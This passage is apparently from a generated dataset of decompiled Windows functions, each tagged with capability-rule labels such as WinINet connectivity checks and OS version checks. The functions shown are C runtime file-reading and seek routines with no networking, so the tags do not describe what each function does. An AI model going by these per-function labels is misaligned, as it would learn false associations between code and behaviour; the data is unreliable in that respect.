iVar3 = fcn.14001bbb4(arg1);\n                        uVar4 = fcn.14001bbb4(arg1);\n                        iVar6 = *((iVar3 >> 6) * 8 + 0x1400403d0) + (uVar4 & 0x3f) * 0x48;\n                    }\n                    if ((*(iVar6 + 0x38) & 0x82) == 0x82) {\n                        LOCK();\n                        *(arg1 + 0x14) = *(arg1 + 0x14) | 0x20;\n                    }\n                }\n                if (((*(arg1 + 4) == 0x200) && ((*(arg1 + 0x14) >> 6 & 1) != 0)) && ((*(arg1 + 0x14) >> 8 & 1) == 0)) {\n                    *(arg1 + 4) = 0x1000;\n                }\n                *(arg1 + 2) = *(arg1 + 2) + -1;\n                uVar1 = **arg1;\n                *arg1 = *arg1 + 1;\n                return uVar1;\n            }\n            LOCK();\n            *(arg1 + 0x14) = *(arg1 + 0x14) | (-(iVar3 != 0) & 8) + 8;\n            *(arg1 + 2) = 0;\n        }\n        else {\n            LOCK();\n            *(arg1 + 0x14) = *(arg1 + 0x14) | 0x10;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 787
    },
    "14001ceb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.14001ceb4(int64_t *arg1, int64_t arg2)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int64_t arg2_00;\n    uint64_t uVar3;\n    int64_t iVar4;\n    uint64_t arg3;\n    \n    if (arg1 == NULL) {\n        *(arg2 + 0x30) = 1;\n        *(arg2 + 0x2c) = 0x16;\n        fcn.14000bf58(0, 0, 0, 0);\n    }\n    else {\n        uVar2 = fcn.14001bbb4(arg1);\n        if (*(arg1 + 2) < 0) {\n            *(arg1 + 2) = 0;\n        }\n        arg2_00 = fcn.14001e294(uVar2 & 0xffffffff, 0, 1, arg2);\n        if (-1 < arg2_00) {\n            if ((*(arg1 + 0x14) & 0xc0) == 0) {\n                return arg2_00 - *(arg1 + 2);\n            }\n            uVar3 = uVar2 & 0x3f;\n            iVar4 = uVar2 >> 6;\n            arg3 = *arg1 - arg1[1];\n            cVar1 = *(*(iVar4 * 8 + 0x1400403d0) + 0x39 + uVar3 * 0x48);\n            if ((*(arg1 + 0x14) & 3) == 0) {\n                if ((*(arg1 + 0x14) >> 2 & 1) == 0) {\n                    *(arg2 + 0x30) = 1;\n                    *(arg2 + 0x2c) = 0x16;\n                    return 0xffffffffffffffff;\n                }\n            }\n            else {\n                if ((cVar1 == '\\x01') && ((*(*(iVar4 * 8 + 0x1400403d0) + 0x3d + uVar3 * 0x48) & 2) != 0)) {\n                    uVar3 = fcn.14001d158(arg1, arg2_00, arg2);\n                    return uVar3;\n                }\n                if (*(*(iVar4 * 8 + 0x1400403d0) + 0x38 + uVar3 * 0x48) < '\\0') {\n                    iVar4 = fcn.14001d2dc(arg1[1], *arg1);\n                    arg3 = arg3 + iVar4;\n                }\n            }\n            if (arg2_00 == 0) {\n                return arg3;\n            }\n            if ((*(arg1 + 0x14) & 1) == 0) {\n                if (cVar1 == '\\x01') {\n                    arg3 = arg3 >> 1;\n                }\n                return arg3 + arg2_00;\n            }\n            uVar3 = fcn.14001d000(arg1, arg2_00, arg3, arg2);\n            return uVar3;\n        }\n    }\n    return 0xffffffffffffffff;\n}\n",
        "token_count": 704
    },
    "14001d00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.14001d000(int64_t *arg1, int64_t arg2, int64_t arg3, ulong arg4)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    bool bVar8;\n    \n    uVar2 = fcn.14001bbb4(arg1);\n    uVar5 = uVar2 & 0x3f;\n    iVar3 = uVar2 >> 6;\n    iVar4 = *(iVar3 * 8 + 0x1400403d0);\n    cVar1 = *(iVar4 + 0x39 + uVar5 * 0x48);\n    iVar7 = (cVar1 == '\\x01') + 1;\n    if (*(arg1 + 2) != 0) {\n        iVar6 = (*(arg1 + 2) - arg1[1]) + *arg1;\n        if (*(iVar4 + 0x38 + uVar5 * 0x48) < '\\0') {\n            iVar4 = fcn.14001e294(uVar2 & 0xffffffff, 0, 2, arg4);\n            if (iVar4 == arg2) {\n                iVar4 = fcn.14001d2dc(arg1[1], arg1[1] + iVar6);\n                bVar8 = (*(arg1 + 0x14) >> 5 & 1) == 0;\n                iVar6 = iVar4 + iVar6;\n            }\n            else {\n                iVar4 = fcn.14001e294(uVar2, arg2, 0, arg4);\n                if (iVar4 == -1) {\n                    return -1;\n                }\n                iVar4 = 0x200;\n                if (((0x200 < iVar6) || ((*(arg1 + 0x14) >> 6 & 1) == 0)) || ((*(arg1 + 0x14) >> 8 & 1) != 0)) {\n                    iVar4 = *(arg1 + 4);\n                }\n                bVar8 = (*(*(iVar3 * 8 + 0x1400403d0) + 0x38 + uVar5 * 0x48) & 4) == 0;\n                iVar6 = iVar4;\n            }\n            if (!bVar8) {\n                iVar6 = iVar6 + (cVar1 - 1U < 2) + 1;\n            }\n        }\n        arg2 = (arg3 / iVar7 - iVar6 / iVar7) + arg2;\n    }\n    return arg2;\n}\n",
        "token_count": 594
    },
    "14001d2d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.14001d2dc(int16_t *arg1, int16_t *arg2)\n\n{\n    int64_t iVar1;\n    char in_R8B;\n    int64_t iVar2;\n    \n    if (in_R8B - 1U < 2) {\n        iVar1 = 0;\n        iVar2 = iVar1;\n        if (arg1 != arg2) {\n            do {\n                iVar1 = iVar2 + 1;\n                if (*arg1 != 10) {\n                    iVar1 = iVar2;\n                }\n                arg1 = arg1 + 1;\n                iVar2 = iVar1;\n            } while (arg1 != arg2);\n        }\n        return iVar1 * 2;\n    }\n    iVar1 = 0;\n    iVar2 = iVar1;\n    if (arg1 != arg2) {\n        do {\n            iVar1 = iVar2 + 1;\n            if (*arg1 != '\\n') {\n                iVar1 = iVar2;\n            }\n            arg1 = arg1 + 1;\n            iVar2 = iVar1;\n        } while (arg1 != arg2);\n    }\n    return iVar1;\n}\n",
        "token_count": 251
    },
    "14001d33": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.14001d334(ulong param_1)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    int64_t var_40h;\n    ulong var_30h;\n    ulong var_28h;\n    uint uStack40;\n    uint uStack36;\n    ulong var_18h;\n    ulong var_bp_10h;\n    ulong var_bp_8h;\n    \n    var_40h = 0;\n    var_18h._0_1_ = *0x1400401e0 == 0;\n    var_30h._0_1_ = 0;\n    var_bp_10h._0_1_ = '\\0';\n    var_bp_8h._0_1_ = '\\0';\n    if (var_18h) {\n        var_28h._0_4_ = *0x14003e3b8;\n        var_28h._4_4_ = *0x14003e3bc;\n        uStack40 = *0x14003e3c0;\n        uStack36 = *0x14003e3c4;\n    }\n    uVar1 = fcn.14001ce48(param_1, &var_40h);\n    if (var_18h == '\\x02') {\n        *(var_40h + 0x3a8) = *(var_40h + 0x3a8) & 0xfffffffd;\n    }\n    if (var_bp_10h != '\\0') {\n        iVar2 = fcn.14000bc38(&var_40h);\n        *(iVar2 + 0x20) = var_18h._4_4_;\n    }\n    if (var_bp_8h != '\\0') {\n        iVar2 = fcn.14000bc38(&var_40h);\n        *(iVar2 + 0x24) = var_bp_10h._4_4_;\n    }\n    return uVar1;\n}\n",
        "token_count": 439
    },
    "14001d3d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.14001d3d8(ulong noname_0, int64_t *arg2, ulong arg3)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint64_t uVar6;\n    bool bVar7;\n    uchar auStackX8 [8];\n    \n    auStackX8[0] = noname_0;\n    uVar1 = fcn.14001bbb4(arg2);\n    uVar6 = uVar1;\n    if ((*(arg2 + 0x14) & 0xc0) == 0) {\n        uVar2 = fcn.14001c8a4(uVar6 & 0xffffffff, auStackX8, 1, arg3);\n        bVar7 = uVar2 == 1;\n    }\n    else {\n        uVar4 = 0;\n        uVar5 = *arg2 - *(arg2 + 1);\n        *arg2 = arg2[1] + 1;\n        *(arg2 + 2) = *(arg2 + 4) + -1;\n        if (uVar5 < 1) {\n            uVar2 = uVar1 + 2;\n            if (uVar1 + 2 < 2) {\n                iVar3 = 0x14003e3d0;\n            }\n            else {\n                uVar2 = *((uVar6 >> 6) * 8 + 0x1400403d0);\n                iVar3 = uVar2 + (uVar1 & 0x3f) * 0x48;\n            }\n            if (((*(iVar3 + 0x38) & 0x20) != 0) &&\n               (uVar2 = fcn.14001e1f8(uVar6 & 0xffffffff, 0, 2),  uVar2 == 0xffffffffffffffff)) {\n                LOCK();\n                *(arg2 + 0x14) = *(arg2 + 0x14) | 0x10;\n                return 0xffffffffffffff01;\n            }\n        }\n        else {\n            uVar2 = fcn.14001c8a4(uVar6 & 0xffffffff, arg2[1], uVar5, arg3);\n            uVar4 = uVar2;\n        }\n        bVar7 = uVar4 == uVar5;\n        uVar2 = uVar2 & 0xffffffffffffff00;\n        *arg2[1] = auStackX8[0];\n    }\n    return uVar2 & 0xffffffffffffff00 | bVar7;\n}\n",
        "token_count": 587
    },
    "14001d7e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.14001d7e8(ulong arg1, uint8_t *arg2, int64_t arg3, ulong arg4)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    ulong uVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    uint8_t *puVar6;\n    uint *puVar7;\n    int64_t iVar8;\n    uint8_t *puVar9;\n    uint64_t uVar10;\n    int32_t iVar11;\n    uint8_t *puVar12;\n    uint8_t *puVar13;\n    int64_t iVar14;\n    uint64_t uVar15;\n    char acStackX8 [8];\n    int32_t aiStackX16 [2];\n    \n    uVar15 = arg1;\n    uVar5 = arg1 & 0x3f;\n    iVar14 = uVar15 >> 6;\n    iVar8 = *(iVar14 * 8 + 0x1400403d0);\n    uVar3 = *(iVar8 + 0x28 + uVar5 * 0x48);\n    if ((arg3 == 0) || (*arg2 != 10)) {\n        puVar9 = iVar8 + 0x38 + uVar5 * 0x48;\n        *puVar9 = *puVar9 & 0xfb;\n    }\n    else {\n        puVar9 = iVar8 + 0x38 + uVar5 * 0x48;\n        *puVar9 = *puVar9 | 4;\n    }\n    puVar9 = arg2 + arg3;\n    puVar13 = arg2;\n    puVar12 = arg2;\n    if (arg2 < puVar9) {\n        do {\n            uVar1 = *puVar13;\n            if (uVar1 == 0x1a) {\n                iVar8 = *(iVar14 * 8 + 0x1400403d0);\n                uVar1 = *(iVar8 + 0x38 + uVar5 * 0x48);\n                if ((uVar1 & 0x40) != 0) {\n                    *puVar12 = 0x1a;\n                    goto code_r0x00014001d963;\n                }\n                *(iVar8 + 0x38 + uVar5 * 0x48) = uVar1 | 2;\n                break;\n            }\n            puVar6 = puVar13 + 1;\n            if (uVar1 == 0xd) {\n                if (puVar9 <= puVar6) {\n                    iVar11 = (*_sym.imp.KERNEL32.dll_ReadFile)(uVar3, acStackX8, 1, aiStackX16, 0);\n                    if ((iVar11 == 0) || (aiStackX16[0] == 0)) {\n                        *puVar12 = 0xd;\n                    }\n                    else if ((*(*(iVar14 * 8 + 0x1400403d0) + 0x38 + (arg1 & 0x3f) * 0x48) & 0x48) == 0) {\n                        if ((acStackX8[0] == '\\n') && (puVar12 == arg2)) goto code_r0x00014001d8f7;\n                        fcn.14001e29c(uVar15 & 0xffffffff, 0xffffffffffffffff);\n                        if (acStackX8[0] == '\\n') break;\n                        *puVar12 = 0xd;\n                    }\n                    else if (acStackX8[0] == '\\n') {\ncode_r0x00014001d8f7:\n                        *puVar12 = 10;\n                    }\n                    else {\n                        *puVar12 = 0xd;\n                        *(*(iVar14 * 8 + 0x1400403d0) + 0x3a + (arg1 & 0x3f) * 0x48) = acStackX8[0];\n                    }\ncode_r0x00014001d963:\n                    puVar12 = puVar12 + 1;\n                    break;\n                }\n                if (*puVar6 == 10) {\n                    *puVar12 = 10;\n                    iVar8 = 2;\n                }\n                else {\n                    *puVar12 = 0xd;\n                    iVar8 = 1;\n                }\n                puVar6 = puVar13 + iVar8;\n            }\n            else {\n                *puVar12 = uVar1;\n            }\n            puVar12 = puVar12 + 1;\n            puVar13 = puVar6;\n        } while (puVar6 < puVar9);\n    }\n    iVar11 = puVar12 - arg2;\n    if (iVar11 == 0) {\n        return 0;\n    }\n    iVar8 = *(iVar14 * 8 + 0x1400403d0);\n    if (*(iVar8 + 0x39 + uVar5 * 0x48) != '\\0') {\n        puVar9 = arg2 + iVar11;\n        if (puVar9[-1] < '\\0') {\n            uVar10 = 1;\n            for (puVar9 = puVar9 + -1;\n                ((uVar4 = uVar10,  *(*puVar9 + 0x14003e420) == '\\0' && (uVar4 < 5)) && (arg2 <= puVar9));\n                puVar9 = puVar9 + -1) {\n                uVar10 = uVar4 + 1;\n            }\n            cVar2 = *(*puVar9 + 0x14003e420);\n            if (cVar2 == '\\0') {\n                puVar7 = fcn.140012c78();\n                *puVar7 = 0x2a;\n                return -1;\n            }\n            if (cVar2 + 1U == uVar4) {\n                puVar9 = puVar9 + uVar10;\n            }\n            else if ((*(iVar8 + 0x38 + uVar5 * 0x48) & 0x48) == 0) {\n                fcn.14001e29c(uVar15 & 0xffffffff, -uVar4, 1);\n            }\n            else {\n                puVar13 = puVar9 + 1;\n                *(iVar8 + 0x3a + uVar5 * 0x48) = *puVar9;\n                if (1 < uVar4) {\n                    uVar1 = *puVar13;\n                    puVar13 = puVar9 + 2;\n                    *(*(iVar14 * 8 + 0x1400403d0) + 0x3b + uVar5 * 0x48) = uVar1;\n                }\n                if (uVar4 == 3) {\n                    uVar1 = *puVar13;\n                    puVar13 = puVar13 + 1;\n                    *(*(iVar14 * 8 + 0x1400403d0) + 0x3c + uVar5 * 0x48) = uVar1;\n                }\n                puVar9 = puVar13 + -uVar10;\n            }\n        }\n        iVar11 = fcn.140020210(0xfde9, 0);\n        if (iVar11 == 0) {\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            fcn.140012bec(uVar4);\n            return -1;\n        }\n        iVar8 = *(iVar14 * 8 + 0x1400403d0);\n        puVar13 = iVar8 + 0x3d + uVar5 * 0x48;\n        *puVar13 = *puVar13 & 0xfd;\n        puVar13 = iVar8 + 0x3d + uVar5 * 0x48;\n        *puVar13 = *puVar13 | -(iVar11 != puVar9 - arg2) & 2U;\n        return iVar11 * 2;\n    }\n    return iVar11;\n}\n",
        "token_count": 1758
    },
    "14001dbd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.14001dbd8(uint64_t arg1, int16_t *arg2, ulong arg3)\n\n{\n    int16_t *piVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    char cVar4;\n    char cVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint64_t uVar8;\n    int16_t *lpMem;\n    ulong uVar9;\n    int16_t *piVar10;\n    int16_t iVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    uint64_t uVar14;\n    int64_t iVar15;\n    int16_t *piVar16;\n    uint32_t auStackX32 [2];\n    uchar auStack104 [8];\n    ulong uStack96;\n    uint64_t uStack88;\n    uint64_t uStack80;\n    int16_t *piStack72;\n    \n    uVar12 = arg1;\n    if (uVar12 == 0xfffffffe) {\n        puVar7 = fcn.140012c58(arg1);\n        *puVar7 = 0;\n        puVar7 = fcn.140012c78();\n        *puVar7 = 9;\n        return -1;\n    }\n    if ((-1 < uVar12) && (uVar12 < *0x1400407d0)) {\n        uVar8 = uVar12 & 0x3f;\n        uStack80 = 1;\n        uStack88 = uVar12 >> 6;\n        iVar15 = *(uStack88 * 8 + 0x1400403d0);\n        uVar3 = *(iVar15 + 0x38 + uVar8 * 0x48);\n        if ((uVar3 & 1) != 0) {\n            if (arg3 < 0x80000000) {\n                if ((arg3 == 0) || ((uVar3 & 2) != 0)) {\n                    return 0;\n                }\n                if (arg2 != NULL) {\n                    cVar5 = *(iVar15 + 0x39 + uVar8 * 0x48);\n                    lpMem = NULL;\n                    uStack96 = *(iVar15 + 0x28 + uVar8 * 0x48);\n                    uVar12 = cVar5 - 1;\n                    if (uVar12 == 0) {\n                        if ((~arg3 & 1) == 0) goto code_r0x00014001dcce;\n                        uVar12 = arg3 >> 1;\n                        if (arg3 >> 1 < 4) {\n                            uVar12 = 4;\n                        }\n                        uVar14 = uVar12;\n                        lpMem = fcn.14001a93c(uVar14);\n                        fcn.140019b4c(0);\n                        uVar9 = 0;\n                        fcn.140019b4c(0);\n                        if (lpMem != NULL) {\n                            uVar9 = fcn.14001e29c(arg1 & 0xffffffff, 0, 1);\n                            *(*(uStack88 * 8 + 0x1400403d0) + 0x30 + uVar8 * 0x48) = uVar9;\n                            iVar15 = *(uStack88 * 8 + 0x1400403d0);\n                            piStack72 = lpMem;\n                            goto code_r0x00014001dd71;\n                        }\n                        puVar7 = fcn.140012c78();\n                        *puVar7 = 0xc;\n                        puVar7 = fcn.140012c58(uVar9);\n                        *puVar7 = 8;\n                    }\n                    else if ((uVar12 == 1) && ((~arg3 & 1) == 0)) {\ncode_r0x00014001dcce:\n                        puVar7 = fcn.140012c58(uVar12);\n                        *puVar7 = 0;\n                        puVar7 = fcn.140012c78();\n                        *puVar7 = 0x16;\n                        fcn.14000c028();\n                    }\n                    else {\n                        uVar14 = arg3;\n                        piStack72 = arg2;\ncode_r0x00014001dd71:\n                        piVar16 = piStack72;\n                        iVar13 = 0;\n                        if ((((*(iVar15 + 0x38 + uVar8 * 0x48) & 0x48) != 0) &&\n                            (cVar4 = *(iVar15 + 0x3a + uVar8 * 0x48),  iVar13 = 0,  cVar4 != '\\n')) &&\n                           (iVar6 = uVar14,  iVar6 != 0)) {\n                            *piStack72 = cVar4;\n                            piVar16 = piStack72 + 1;\n                            uVar14 = iVar6 - 1U;\n                            iVar13 = 1;\n                            *(*(uStack88 * 8 + 0x1400403d0) + 0x3a + uVar8 * 0x48) = 10;\n                            if (((cVar5 != '\\0') &&\n                                (cVar4 = *(*(uStack88 * 8 + 0x1400403d0) + 0x3b + uVar8 * 0x48),  cVar4 != '\\n')) &&\n                               (iVar6 - 1U != 0)) {\n                                *piVar16 = cVar4;\n                                iVar13 = 2;\n                                piVar16 = piStack72 + 1;\n                                uVar14 = iVar6 - 2U;\n                                *(*(uStack88 * 8 + 0x1400403d0) + 0x3b + uVar8 * 0x48) = 10;\n                                if (((cVar5 == '\\x01') &&\n                                    (cVar4 = *(*(uStack88 * 8 + 0x1400403d0) + 0x3c + uVar8 * 0x48),  cVar4 != '\\n')) &&\n                                   (iVar6 - 2U != 0)) {\n                                    *piVar16 = cVar4;\n                                    iVar13 = 3;\n                                    piVar16 = piStack72 + 3;\n                                    uVar14 = iVar6 - 3;\n                                    *(*(uStack88 * 8 + 0x1400403d0) + 0x3c + uVar8 * 0x48) = 10;\n                                }\n                            }\n                        }\n                        iVar6 = fcn.140026724(arg1 & 0xffffffff);\n                        if (((iVar6 == 0) || (-1 < *(*(uStack88 * 8 + 0x1400403d0) + 0x38 + uVar8 * 0x48))) ||\n                           (iVar6 = (*_sym.imp.KERNEL32.dll_GetConsoleMode)(uStack96, auStack104),  iVar6 == 0)) {\n                            uStack80 = uStack80 & 0xffffffffffffff00;\ncode_r0x00014001dea4:\n                            uVar9 = uStack96;\n                            iVar6 = (*_sym.imp.KERNEL32.dll_ReadFile)(uStack96, piVar16, uVar14, auStackX32, 0);\n                            if ((iVar6 != 0) && (auStackX32[0] <= arg3)) {\ncode_r0x00014001dee0:\n                                iVar13 = iVar13 + auStackX32[0];\n                                if (*(*(uStack88 * 8 + 0x1400403d0) + 0x38 + uVar8 * 0x48) < '\\0') {\n                                    uVar14 = iVar13;\n                                    if (cVar5 == '\\x02') {\n                                        if (uStack80 == '\\0') {\n                                            iVar13 = fcn.14001d610(arg1 & 0xffffffff, piStack72, uVar14 >> 1);\n                                        }\n                                        else {\n                                            piVar1 = piStack72 + (uVar14 & 0xfffffffffffffffe);\n                                            piVar16 = piStack72;\n                                            for (piVar10 = piStack72; piVar10 < piVar1; piVar10 = piVar10 + iVar15) {\n                                                iVar11 = *piVar10;\n                                                if (iVar11 == 0x1a) {\n                                                    puVar2 = *(uStack88 * 8 + 0x1400403d0) + 0x38 + uVar8 * 0x48;\n                                                    *puVar2 = *puVar2 | 2;\n                                                    break;\n                                                }\n                                                if (((iVar11 == 0xd) && (piVar10 + 1 < piVar1)) && (piVar10[1] == 10)) {\n                                                    iVar11 = 10;\n                                                    iVar15 = 4;\n                                                }\n                                                else {\n                                                    iVar15 = 2;\n                                                }\n                                                *piVar16 = iVar11;\n                                                piVar16 = piVar16 + 1;\n                                            }\n                                            iVar13 = (piVar16 - piStack72 >> 1) * 2;\n                                        }\n                                    }\n                                    else {\n                                        iVar13 = fcn.14001d7e8(arg1 & 0xffffffff, piVar16, uVar14, arg2);\n                                    }\n                                }\n                                goto code_r0x00014001de84;\n                            }\n                            uVar12 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                            if (uVar12 != 5) {\n                                if (uVar12 == 0x6d) {\n                                    iVar13 = 0;\n                                    goto code_r0x00014001de84;\n                                }\n                                goto code_r0x00014001de7a;\n                            }\n                            puVar7 = fcn.140012c78();\n                            *puVar7 = 9;\n                            puVar7 = fcn.140012c58(uVar9);\n                            *puVar7 = 5;\n                        }\n                        else {\n                            if (cVar5 != '\\x02') goto code_r0x00014001dea4;\n                            iVar6 = (*_sym.imp.KERNEL32.dll_ReadConsoleW)(uStack96, piVar16, uVar14 >> 1, auStackX32, 0)\n                            ;\n                            if (iVar6 != 0) {\n                                auStackX32[0] = auStackX32[0] * 2;\n                                goto code_r0x00014001dee0;\n                            }\n                            uVar12 = (*_sym.imp.KERNEL32.dll_GetLastError)();\ncode_r0x00014001de7a:\n                            fcn.140012bec(uVar12);\n                        }\n                    }\n                    iVar13 = -1;\ncode_r0x00014001de84:\n                    fcn.140019b4c(lpMem);\n                    return iVar13;\n                }\n            }\n            puVar7 = fcn.140012c58(arg1);\n            *puVar7 = 0;\n            puVar7 = fcn.140012c78();\n            *puVar7 = 0x16;\n            goto code_r0x00014001e00a;\n        }\n    }\n    puVar7 = fcn.140012c58(arg1);\n    *puVar7 = 0;\n    puVar7 = fcn.140012c78();\n    *puVar7 = 9;\ncode_r0x00014001e00a:\n    fcn.14000c028();\n    return -1;\n}\n",
        "token_count": 2519
    },
    "14001e1f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.14001e1f8(ulong param_1, ulong param_2, ulong param_3)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    int64_t var_40h;\n    ulong var_30h;\n    ulong var_28h;\n    uint uStack40;\n    uint uStack36;\n    ulong var_18h;\n    ulong var_bp_10h;\n    ulong var_bp_8h;\n    \n    var_40h = 0;\n    var_18h._0_1_ = *0x1400401e0 == 0;\n    var_30h._0_1_ = 0;\n    var_bp_10h._0_1_ = '\\0';\n    var_bp_8h._0_1_ = '\\0';\n    if (var_18h) {\n        var_28h._0_4_ = *0x14003e3b8;\n        var_28h._4_4_ = *0x14003e3bc;\n        uStack40 = *0x14003e3c0;\n        uStack36 = *0x14003e3c4;\n    }\n    uVar1 = fcn.14001e024(param_1, param_2, param_3, &var_40h);\n    if (var_18h == '\\x02') {\n        *(var_40h + 0x3a8) = *(var_40h + 0x3a8) & 0xfffffffd;\n    }\n    if (var_bp_10h != '\\0') {\n        iVar2 = fcn.14000bc38(&var_40h);\n        *(iVar2 + 0x20) = var_18h._4_4_;\n    }\n    if (var_bp_8h != '\\0') {\n        iVar2 = fcn.14000bc38(&var_40h);\n        *(iVar2 + 0x24) = var_bp_10h._4_4_;\n    }\n    return uVar1;\n}\n",
        "token_count": 459
    },
    "14001e29": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.14001e29c(ulong param_1, ulong param_2, ulong param_3)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    int64_t var_40h;\n    ulong var_30h;\n    ulong var_28h;\n    uint uStack40;\n    uint uStack36;\n    ulong var_18h;\n    ulong var_bp_10h;\n    ulong var_bp_8h;\n    \n    var_40h = 0;\n    var_18h._0_1_ = *0x1400401e0 == 0;\n    var_30h._0_1_ = 0;\n    var_bp_10h._0_1_ = '\\0';\n    var_bp_8h._0_1_ = '\\0';\n    if (var_18h) {\n        var_28h._0_4_ = *0x14003e3b8;\n        var_28h._4_4_ = *0x14003e3bc;\n        uStack40 = *0x14003e3c0;\n        uStack36 = *0x14003e3c4;\n    }\n    uVar1 = fcn.14001e14c(param_1, param_2, param_3, &var_40h);\n    if (var_18h == '\\x02') {\n        *(var_40h + 0x3a8) = *(var_40h + 0x3a8) & 0xfffffffd;\n    }\n    if (var_bp_10h != '\\0') {\n        iVar2 = fcn.14000bc38(&var_40h);\n        *(iVar2 + 0x20) = var_18h._4_4_;\n    }\n    if (var_bp_8h != '\\0') {\n        iVar2 = fcn.14000bc38(&var_40h);\n        *(iVar2 + 0x24) = var_bp_10h._4_4_;\n    }\n    return uVar1;\n}\n",
        "token_count": 459
    },
    "14001e6c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.14001e6cc(ulong noname_0, ulong noname_1, ulong noname_2, ulong noname_3, ulong arg_30h)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    int64_t var_40h;\n    ulong var_30h;\n    ulong var_bp_28h;\n    uint uStack40;\n    uint uStack36;\n    ulong var_18h;\n    ulong var_bp_10h;\n    ulong var_bp_8h;\n    \n    var_40h = 0;\n    var_18h._0_1_ = *0x1400401e0 == 0;\n    var_30h._0_1_ = 0;\n    var_bp_10h._0_1_ = '\\0';\n    var_bp_8h._0_1_ = '\\0';\n    if (var_18h) {\n        var_bp_28h._0_4_ = *0x14003e3b8;\n        var_bp_28h._4_4_ = *0x14003e3bc;\n        uStack40 = *0x14003e3c0;\n        uStack36 = *0x14003e3c4;\n    }\n    uVar1 = fcn.14001e3ac(noname_0, noname_1, noname_2, noname_3);\n    if (var_18h == '\\x02') {\n        *(var_40h + 0x3a8) = *(var_40h + 0x3a8) & 0xfffffffd;\n    }\n    if (var_bp_10h != '\\0') {\n        iVar2 = fcn.14000bc38(&var_40h);\n        *(iVar2 + 0x20) = var_18h._4_4_;\n    }\n    if (var_bp_8h != '\\0') {\n        iVar2 = fcn.14000bc38(&var_40h);\n        *(iVar2 + 0x24) = var_bp_10h._4_4_;\n    }\n    return uVar1;\n}\n",
        "token_count": 479
    },
    "14001e89": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
